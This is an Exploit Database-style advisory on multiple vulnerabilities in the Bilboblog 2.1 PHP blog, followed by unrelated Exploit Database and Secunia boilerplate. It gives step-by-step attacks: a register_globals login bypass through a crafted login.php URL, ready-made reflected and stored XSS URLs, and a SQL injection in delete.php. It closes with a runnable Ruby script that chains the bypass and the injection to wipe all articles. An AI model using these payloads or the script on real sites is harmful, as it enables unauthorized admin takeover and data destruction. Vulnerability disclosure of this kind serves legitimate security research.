  ------------------------------------------------------------------

  Name         :   Bilboblog 2.1 Multiples Vulnerabilities
  Description  :   Bilboblog is a small application of micro-blogging in Php / MySQL
  Link         :   http://www.tux-planet.fr/bilboblog-version-021-english-translation/

  Vuln. types  :   Login Bypass - Cross Site Scripting - SQL Injection - Full Path Disclosure

  Conditions   :   - SQL Injection      :  Magic Quotes Off
                   - Login Bypass, XSS  :  Register Globals On

  Credits      :   Black_H <bl4ck.h@gmail.com>

  ------------------------------------------------------------------

   .: I. Login Bypass
   -------------------

   This vulnerability need register_global on.
   The file "admin/index.php" (and most of the admin files) includes the file 'login.php' (at line 23) which contains :

   22| session_start();
   23| $checkLogin = false;
   24| #echo "toto".$_SESSION['admin_login']; // note: wtf ??
   25| if(!isset($_SESSION['admin_login'])) {
   26|
   27|   # Check form values
   28|   if (isset($_POST) && (!empty($_POST['admin_login'])) && (!empty($_POST['admin_passwd'])) ) {
   29|
   30|     # Get Session vriables
   31|     $admin_login  = trim($_POST['admin_login']);
   32|     $admin_passwd = trim($_POST['admin_passwd']);
   33|
   34|     # Check login
   35|     if($admin_login == $login && $admin_passwd == $password) {
   36|       $checkLogin = true;
   37|       $_SESSION['admin_login']  = $admin_login;
   38|      $_SESSION['admin_passwd'] = $admin_passwd;
   39|     }
   40|   }
   41|
   42| } else {
   43|   $checkLogin = true;
   44| }
   45|
   46|    22| if(!$checkLogin) {
   47|
   48|   # Print login form
            [...]
   58|     exit(0);
   59| }

   So, we need the session 'admin_login' ( $_SESSION['admin_login'] ) to have admin rights in all files. The script checks
   if we have post good login and pass or not. It's look like good, but if we call directly the login.php file,
   the $login and $password variable  are not defined. We can set them with register_globals on, valid the form with
   the same value and so set $_SESSION['admin_login'].

   In facts, go on the page http://site.com/bilboblog/admin/login.php?login=1&password=1 and fill the forms with '1' value
   and submit. Because checkLogin is true nothing is printed and you're  admin :)))

   .: II. Cross Site Scripting
   ----------------------------

        1) Permanent XSS

   When an admin  ( legitim or not :)) ) post an article, the enCode function is applied to the content :

   ---- 'admin/update.php'

   25| # Check values
   26| if(isset($_POST['content']) && $_POST['content'] != "") {
   27| $content = enCode(substr(trim($_POST['content']), 0, $limit_post));
        [...]
   36| # Insert new content
   37| $sql = "INSERT INTO $db_table VALUES ('', '".time()."', '$content');";
   38| $result = mysql_query($sql);

   ---- 'admin/function.php'

   141| function enCode($chaine) {
   142|
        [...] // # Youtube & Dailymotion encode url
   145|
   146|  # Detect string encoding
   147|  $encodage = mb_detect_encoding($chaine);
   148|  if($encodage == "ASCII") $encodage = "iso-8859-1"; # Htmlentities unknown ASCII
   149|
   150|  # Convert special char to html code
   151|  $chaine = htmlentities($chaine,ENT_QUOTES,$encodage);
   152|  $chaine = addslashes($chaine);
   153|
   154|  # Return result
   155|  return $chaine;
   156| }

   The function clean all html chars in the content that we've submit.
   It protects the user against XSS in all pages of the blog but in the 'widget.php' file stripslashes()
   and html_entity_decode() functions is applied to the content which is printed !
   So je just need to get admin rights (see upper) post malicious code and share widget.php's url to the victim.

        2) Unpermanents XSS

   The file "index.php" includes the file 'head.php' (at line 21) which contains :

   44| if ($_SERVER['QUERY_STRING'] != "" && intval($_SERVER['QUERY_STRING']) != "") {
     [...]
   55| $titleId = str2Url($liste[2], 100, 0).' - '.$title;
   56| }

   78| <title><?php if(!empty($titleId)) { echo $titleId; } else { echo $title; } ?></title>
   79| </head>

   When a page is loaded, the script checks if a number is present in the url to see if she could print an article.
   If the URL ( $_SERVER['QUERY_STRING'] ) contains a number (the id) the script load the article corresponding to the id
   in $_SERVER['QUERY_STRING'].

   If $_SERVER['QUERY_STRING'] (the url) do not contain a number, the variable $titleId is not set and print :
   we can define it on add a parameter titleId in the url and his value will be printed on the web page.
   But, the variable $titleId is betwenn the <head> balise, so we need to add </title></head><body> before the malicious code.
   We have : http://site.com/bilboblog/?titleId=TITLE</title></head><body><script>alert(1);</script>

   Anyway, there are unfunny XSS in admin files and 'footer.php' :

        http://site.com/bilboblog/footer.php?t_lang[lang_copyright]=XSS
        http://site.com/bilboblog/admin/?content=&lt;/textarea&gt;XSS
        http://site.com/bilboblog/admin/homelink.php?url=">XSS
        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_help]=XSS
        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_clear_cache]=XSS
        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_home]=XSS
        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_logout]=XSS

    and also in /admin/post.php ...

   .: III. SQL Injection
   ----------------------

   In admin panel, we can delete articles by sending article's id we want to supress to the script delete.php
   which clean the id of spaces and include it in a basic sql query :

   25| # Check values
   26| if(isset($_POST['num']) && $_POST['num'] != "") {
   27| $article = trim($_POST['num']);

   36| # Insert new content // It's look like a copy/paste :))
   37| $sql = "DELETE FROM $db_table WHERE num_article = '$article';";
   38| $result = mysql_query($sql);

   So, with magic_quotes off, we can inject sql code in the query and, by example, delete all entries
   (all articles) in the database.
   To delete all entries, we must send a post request to delete.php, for the poc see at the end of file.

   .: IV. Full Path Disclosure
   ----------------------------

   And to finish, the are to FPD which can be exploited for a server attack or in sql injection :
        http://localhost/Audits/bilboblog/footer.php?enable_cache=false
        http://localhost/Audits/bilboblog/pagination.php // don't need any conditions

   .: Ã•. SQL INJECTION POC (Ruby)
   ---------------------------------------

   # -- CUT

   # Config
   host = 'site.com'
   path = '/bilboblog/'
   # -- End

   require 'net/http'
   http = Net::HTTP.new(host)

   data = { 0 => "admin_login=1&admin_passwd=1", 1 => "num=-1'  OR num_article > 0#" }
   resp = http.post(path+'admin/login.php?login=1&password=1', data[0])

   cookie = {  'Cookie' => resp.response['set-cookie'] }
   resp = http.post(path+'admin/delete.php', data[1], cookie)
   if(resp.code.to_s == '302') : puts 'Done !' end

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
